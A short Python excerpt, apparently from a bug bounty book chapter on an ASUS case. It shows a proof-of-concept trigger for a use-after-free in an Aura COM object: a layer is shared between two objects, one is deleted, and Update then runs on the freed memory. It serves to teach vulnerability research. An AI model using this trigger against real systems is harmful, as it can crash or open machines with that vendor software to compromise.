# Extraído de: LibroBugBounty/cap-22-caso-asus.md
anim1 = win32com.client.Dispatch(CLSID_AURA)
anim2 = win32com.client.Dispatch(CLSID_AURA)
anim1.init(10, 10)
anim2.init(10, 10)

layer = anim1.CreateLayer()
anim2.AddLayer(layer)  # Compartido entre dos animations

del anim1  # Libera recursos del layer
anim2.Update()  # UAF: opera sobre layer liberado
